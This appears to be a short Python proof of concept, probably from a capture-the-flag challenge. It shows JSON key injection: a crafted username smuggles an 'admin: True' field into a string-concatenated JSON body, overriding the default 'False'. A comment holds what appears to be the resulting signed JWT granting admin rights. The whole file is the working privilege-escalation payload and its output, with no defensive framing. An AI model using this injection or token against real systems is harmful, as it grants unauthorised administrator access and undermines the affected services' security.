import json

username = 'upi05", "admin": "True'

body = '{' + '"admin": "' + "False" + '", "username": "' + str(username) + '"}'

body = json.loads(body)

print(body)

#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IlRydWUiLCJ1c2VybmFtZSI6InVwaTA1In0.mZ8gQMoB3blpW6QYYjWe-02F9K6ZLmttUunw93smgGI
